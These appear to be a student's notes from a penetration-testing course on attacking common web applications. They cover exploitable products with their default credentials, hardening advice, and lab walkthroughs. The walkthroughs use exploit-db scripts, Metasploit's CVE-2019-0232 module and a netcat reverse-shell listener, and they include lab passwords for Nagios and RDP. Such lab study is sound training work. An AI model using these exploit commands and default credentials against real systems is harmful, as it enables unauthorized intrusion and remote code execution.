|[Axis2](https://axis.apache.org/axis2/java/core/)|This can be abused similar to Tomcat. We will often actually see it sitting on top of a Tomcat installation. If we cannot get RCE via Tomcat, it is worth checking for weak/default admin credentials on Axis2. We can then upload a [webshell](https://github.com/tennc/webshell/tree/master/other/cat.aar) in the form of an AAR file (Axis2 service file). There is also a Metasploit [module](https://packetstormsecurity.com/files/96224/Axis2-Upload-Exec-via-REST.html) that can assist with this.|
|[Websphere](https://en.wikipedia.org/wiki/IBM_WebSphere_Application_Server)|Websphere has suffered from many different [vulnerabilities](https://www.cvedetails.com/vulnerability-list/vendor_id-14/product_id-576/cvssscoremin-9/cvssscoremax-/IBM-Websphere-Application-Server.html) over the years. Furthermore, if we can log in to the administrative console with default credentials such as `system:manager` we can deploy a WAR file (similar to Tomcat) and gain RCE via a web shell or reverse shell.|
|[Elasticsearch](https://en.wikipedia.org/wiki/Elasticsearch)|Elasticsearch has had its fair share of vulnerabilities as well. Though old, we have seen [this](https://www.exploit-db.com/exploits/36337) before on forgotten Elasticsearch installs during an assessment for a large enterprise (and identified within 100s of pages of EyeWitness report output). Though not realistic, the Hack The Box machine [Haystack](https://youtube.com/watch?v=oGO9MEIz_tI&t=54) features Elasticsearch.|
|[Zabbix](https://en.wikipedia.org/wiki/Zabbix)|Zabbix is an open-source system and network monitoring solution that has had quite a few [vulnerabilities](https://www.cvedetails.com/vulnerability-list/vendor_id-5667/product_id-9588/Zabbix-Zabbix.html) discovered such as SQL injection, authentication bypass, stored XSS, LDAP password disclosure, and remote code execution. Zabbix also has built-in functionality that can be abused to gain remote code execution. The HTB box [Zipper](https://youtube.com/watch?v=RLvFwiDK_F8&t=250) showcases how to use the Zabbix API to gain RCE.|
|[Nagios](https://en.wikipedia.org/wiki/Nagios)|Nagios is another system and network monitoring product. Nagios has had a wide variety of issues over the years, including remote code execution, root privilege escalation, SQL injection, code injection, and stored XSS. If you come across a Nagios instance, it is worth checking for the default credentials `nagiosadmin:PASSW0RD` and fingerprinting the version.|
|[WebLogic](https://en.wikipedia.org/wiki/Oracle_WebLogic_Server)|WebLogic is a Java EE application server. At the time of writing, it has 190 reported [CVEs](https://www.cvedetails.com/vulnerability-list/vendor_id-93/product_id-14534/Oracle-Weblogic-Server.html). There are many unauthenticated RCE exploits from 2007 up to 2021, many of which are Java Deserialization vulnerabilities.|
|Wikis/Intranets|We may come across internal Wikis (such as MediaWiki), custom intranet pages, SharePoint, etc. These are worth assessing for known vulnerabilities but also searching if there is a document repository. We have run into many intranet pages (both custom and SharePoint) that had a search functionality which led to discovering valid credentials.|
|[DotNetNuke](https://en.wikipedia.org/wiki/DNN_(software))|DotNetNuke (DNN) is an open-source CMS written in C# that uses the .NET framework. It has had a few severe [issues](https://www.cvedetails.com/vulnerability-list/vendor_id-2486/product_id-4306/Dotnetnuke-Dotnetnuke.html) over time, such as authentication bypass, directory traversal, stored XSS, file upload bypass, and arbitrary file download.|
|[vCenter](https://en.wikipedia.org/wiki/VCenter)|vCenter is often present in large organizations to manage multiple instances of ESXi. It is worth checking for weak credentials and vulnerabilities such as this [Apache Struts 2 RCE](https://blog.gdssecurity.com/labs/2017/4/13/vmware-vcenter-unauthenticated-rce-using-cve-2017-5638-apach.html) that scanners like Nessus do not pick up. This [unauthenticated OVA file upload](https://www.rapid7.com/db/modules/exploit/multi/http/vmware_vcenter_uploadova_rce/) vulnerability was disclosed in early 2021, and a PoC for [CVE-2021-22005](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22005) was released during the development of this module. vCenter comes as both a Windows and a Linux appliance. If we get a shell on the Windows appliance, privilege escalation is relatively simple using JuicyPotato or similar. We have also seen vCenter already running as SYSTEM and even running as a domain admin! It can be a great foothold in the environment or be a single source of compromise.|

```
Once again, this is not an exhaustive list but just more examples of the many things we may come across in a corporate network. As shown here, often, a default password and built-in functionality are all we need.

## Questions 
Q1: Enumerate the target host and identify the running application. What application is running?
- We enumerate using nmap, find version fo application (ref to ## Overview) and search for exploit (ref to ## Overview)

sudo nmap -sV 10.129.201.120 # short version:
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
445/tcp  open  microsoft-ds?
7001/tcp open  http          Oracle WebLogic admin httpd 12.2.1.3 (T3 enabled)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Q2: Search for exploit given the application (ref to ## Overview).
The vulnerability seems to be related to CVE-2020-14882. Confirmed exploitation by reading the description of it.

cp /opt/exploit-database/exploits/java/webapps/49479.py .
python 49479.py -h // looking at usage
python 49479.py -u http://10.129.201.102:7001/
```

## Closing out

#### Application Hardenning
```
## Overview
- The first step for any organization should be to create a detailed (and accurate) application inventory of both internal and external-facing applications. 
 
	-> This can be achieved in many ways, and blue teams on a budget could benefit from pentesting tools such as Nmap and EyeWitness to assist in the process. 
	
	-> Various open-source and paid tools can be used to create and maintain this inventory. Without knowing what exists in the environment, we won't know what to protect! 
	
	-> Creating this inventory may expose instances of "shadow IT" (or unauthorized installs), deprecated applications that are no longer needed, or even issues such as a trial version of a tool being converted to a free version automatically (such as Splunk when it no longer requires authentication).

## General Hardenning tips
- The applications discussed in this section should be hardened to prevent compromise using these techniques and others. 
 
	-> Below are some important measures that can help secure deployments of WordPress, Drupal, Joomla, Tomcat, Jenkins, osTicket, GitLab, PRTG Network Monitor, and Splunk in any environment.

- `Secure authentication`: Applications should enforce strong passwords during registration and setup, and default administrative account passwords should be changed. 
 
	-> If possible, the default administrative accounts should be disabled, with new custom administrative accounts created.
	
	 -> Some applications inherently support 2FA authentication, which should be made mandatory for at least administrator-level users.
    
- `Access controls`: Proper access control mechanisms should be implemented per application. 
	
	-> For example, login pages should not be accessible from the external network unless there is a valid business reason for this access. 
	
	-> Similarly, file and folder permissions can be configured to deny uploads or application deployments.
    
- `Disable unsafe features`: Features such as PHP code editing in WordPress can be disabled to prevent code execution if the server is compromised.
    
- `Regular updates`: Applications should be updated regularly, and patches supplied by vendors should be applied as soon as possible.
    
- `Backups`: System administrators should always configure website and database backups, allowing the application to be quickly restored in case of a compromise.
    
- `Security monitoring`: There are various tools and plugins that can be used to monitor the status and various security-related issues for our applications. 
	-> Another option is a Web Application Firewall (WAF). While not a silver bullet, a WAF can help add an extra layer of protection provided all the measures above have already been taken.
    
- `LDAP integration with Active Directory`: Integrating applications with Active Directory single sign-on can increase ease of access, provide more auditing functionality (especially if synced with Azure), and make managing credentials and service accounts more streamlined.
	-> It also decreases the number of accounts and passwords that a user will have to remember and give fine-grained control over the password policy.
    

- Every application that we discussed in this module (and beyond) should be following key hardening guidelines such as enabling multi-factor authentication for admins and users wherever possible, changing default admin user account names, limiting the number of admins, and how admins can access the site (i.e., not from the open internet), enforce the principle of least privilege throughout the application, perform regular updates to address security vulnerabilities, taking regular backups to a secondary location to be able to recover quickly in the event of an attack and implement security monitoring tools that can detect and block malicious activity and account brute-forcing, among other attacks.

- Finally, we should be careful with what we expose to the internet. 
	
	-> Does that GitLab repo really need to be public? 
	
	-> Does our ticketing system need to be accessible outside the internal network? With these controls in place, we will have a solid baseline to apply to all applications regardless of their function.

- We should also perform regular checks and updates to our application inventory to ensure that we are not exposing applications on the internal or external network that are no longer needed or have severe security flaws. 
	-> Finally, perform regular assessments to look for security vulnerabilities and misconfigurations as well as sensitive data exposure. Follow through on remediation recommendations included in your penetration testing reports and periodically check for the same types of flaws discovered by your penetration testers. 
	
	-> Some could be process-related, requiring a mindset shift for the organization to become more security conscious.

## Application-Specific Hardening Tips
- Though the general concepts for application hardening apply to all applications that we discussed in this module and will encounter in the real world, we can take some more specific measures. Here are a few:
```

|Application|Hardening Category|Discussion|
|---|---|---|
|[WordPress](https://wordpress.org/support/article/hardening-wordpress/)|Security monitoring|Use a security plugin such as [WordFence](https://www.wordfence.com/) which includes security monitoring, blocking of suspicious activity, country blocking, two-factor authentication, and more|
|[Joomla](https://docs.joomla.org/Security_Checklist/Joomla!_Setup)|Access controls|A plugin such as [AdminExile](https://extensions.joomla.org/extension/adminexile/) can be used to require a secret key to log in to the Joomla admin page such as `http://joomla.inlanefreight.local/administrator?thisismysecretkey`|
|[Drupal](https://www.drupal.org/docs/security-in-drupal)|Access controls|Disable, hide, or move the [admin login page](https://www.drupal.org/docs/7/managing-users/hide-user-login)|
|[Tomcat](https://tomcat.apache.org/tomcat-9.0-doc/security-howto.html)|Access controls|Limit access to the Tomcat Manager and Host-Manager applications to only localhost. If these must be exposed externally, enforce IP whitelisting and set a very strong password and non-standard username.|
|[Jenkins](https://www.jenkins.io/doc/book/security/securing-jenkins/)|Access controls|Configure permissions using the [Matrix Authorization Strategy plugin](https://plugins.jenkins.io/matrix-auth)|
|[Splunk](https://docs.splunk.com/Documentation/Splunk/8.2.2/Security/Hardeningstandards)|Regular updates|Make sure to change the default password and ensure that Splunk is properly licensed to enforce authentication|
|[PRTG Network Monitor](https://kb.paessler.com/en/topic/61108-what-security-features-does-prtg-include)|Secure authentication|Make sure to stay up-to-date and change the default PRTG password|
|osTicket|Access controls|Limit access from the internet if possible|
|[GitLab](https://about.gitlab.com/blog/2020/05/20/gitlab-instance-security-best-practices/)|Secure authentication|Enforce sign-up restrictions such as requiring admin approval for new sign-ups, configuring allowed and denied domains|

```
## Conclusion
- In this module, we covered a critical area of penetration testing: common applications. Web applications present an enormous attack surface and often go overlooked. 
 
	-> During an external penetration test, often, the majority of our targets are applications. We must understand how to discover applications (and organize our scan data to process it efficiently), footprint versions, discover known vulnerabilities, and leverage built-in functionality. 
	
	-> Many organizations do well with patching and vulnerability management but often overlook issues such as weak credentials to access Tomcat Manager or a printer with default credentials for the web management application where we can obtain LDAP credentials to use as a foothold into the internal network.
	
	 -> The three skills assessments that follow are meant to put the application discovery and enumeration process to the test.
```

## Skills Assessment

#### Skills 1
```
During a penetration test against the company Inlanefreight, you have performed extensive enumeration and found the network to be quite locked down and well-hardened. You come across one host of particular interest that may be your ticket to an initial foothold. Enumerate the target host for potentially vulnerable applications, obtain a foothold, and submit the contents of the flag.txt file to complete this portion of the skills assessment.

- nmap scan (ref to Other Notable applications ## Overview)
sudo nmap 10.129.201.89 -sV
	-> not working, trying a simpler nmap scan.

sudo nmap 10.129.201.89 
	-> 
	21/tcp   open  ftp           Microsoft ftpd
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
8000/tcp open  http          Jetty 9.4.42.v20210604
8009/tcp open  ajp13         Apache Jserv (Protocol v1.3)
8080/tcp open  http          Apache Tomcat/Coyote JSP engine 1.1

	-> We have an jenkins 9.4.42, Apache Tomcat.

	-> Looking for Apache Tomcat first (ref to ## enumeration in Tomcat - Discovery & Enumeration)

- Clicked on host-managr and received and 404 error. It seems to have Apache 9.0.0.M1 version

	-> Vulnerable to `CVE-2019-0232` for Tomcat CGI.

	-> Be performing enumeration (ref ##Enumeration Attacking Tomcat CGI)


- Fuzzing Extentions - .cmd
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.201.89:8080/cgi/FUZZ.cmd
-> nothing

- Fuzzing Extentions - .BAT
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.201.89:8080/cgi/FUZZ.bat

-> [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 364ms]
    * FUZZ: cmd

-> Access page (ref to ## Exploitation Attacking Tomcat CGI)
http://10.129.201.89:8080/cgi/cmd.bat?&dir

http://10.129.201.89:8080/cgi/cmd.bat?&dir C:\
-> didn't work.

- Doing some research, we the following in metasploit
[msf](Jobs:0 Agents:0) >> search CVE-2019-0232

set TARGETURI /cgi/cmd.bat
set rhosts 10.129.201.89

set LHOST 10.10.16.6

set ForceExploit true
run

-> got shell, obtained rce and got flag.
```

#### Skills 2
```
During an external penetration test for the company Inlanefreight, you come across a host that, at first glance, does not seem extremely interesting. At this point in the assessment, you have exhausted all options and hit several dead ends. Looking back through your enumeration notes, something catches your eye about this particular host. You also see a note that you don't recall about the `gitlab.inlanefreight.local` vhost.

Performing deeper and iterative enumeration reveals several serious flaws. Enumerate the target carefully and answer all the questions below to complete the second part of the skills assessment.

10.129.201.90

nmap scan:
sudo nmap -sV -sC 10.129.201.90

-> port 8180 open on nginx. 

- Fuzz for vhosts (refer to ## Name-based Virtual Hosting in Information Gathering- Web Edition)

ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://10.129.201.90 -H "HOST: FUZZ.inlanefreight.local"
-> fs=46166

ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://10.129.201.90 -H "HOST: FUZZ.inlanefreight.local" -fs 46166
-> blog, monitoring and gitlab vhosts obtained.

- Self-created username as tester123:12345678 on gitlab (ref to ## Enumeration Gitlab - Discovery & Enumeration)

	-> Going to the projects page we see virtualhost and Nagios Postgresql projects.
		-> taking a look at them. 
		-> obtained nagiosadmin:oilaKglm7M09@CPL&^lC credential for Nagios application. 
			-> Nagios is an event monitoring system, also in ##honorable mentions in Other notable applications..


-> going to monitoring.inlanefreight.local to have a look at it.
	-> saw an login page and attempted to logged in with our credentials.
	-> Logged in as admin

	-> Looked at source code and obtained Nagios XI 5.7.5 version (##overview, footprinting techniques from other notable applications)

	-> Looking up on public exploits.

		-> Saw an Nagios XI 5.7.X - Remote Code Execution RCE (Authenticated) on searchsploit

	-> attempt to perform exploitation.

searchsploit -p 49422

cp /opt/exploit-database/exploits/php/webapps/49422.py .

python 49422.py http://monitoring.inlanefreight.local nagiosadmin 'oilaKglm7M09@CPL&^lC' 10.10.16.6 80

	-> Set up listener on our side
	sudo nc -lvnp 80

	-> finding flag
	ls 
	cat f5088a862528cbb16b4e253f1809882c_flag.txt 
```

#### Skills 3
```
During our penetration test our team found a Windows host running on the network and the corresponding credentials for the Administrator. It is required that we connect to the host and find the `hardcoded password` for the MSSQL service.

xfreerdp +bitmap-cache /network:auto /dynamic-resolution /compression-level:2 /u:Administrator /p:'xcyj8izxNVzhf4z' /v:10.129.95.200 /tls-seclevel:0 /timeout:80000

Q: What is the hardcoded password for the database connection in the MultimasterAPI.dll file?

	-> Found MultimasterAPI.dll in C:\inetpub\wwwroot\bin, ref to ## DLL File Examination in Attacking Applications Connecting to Services

		-> Openning with Dnspy and openning ColleageController yields the password.
```




``
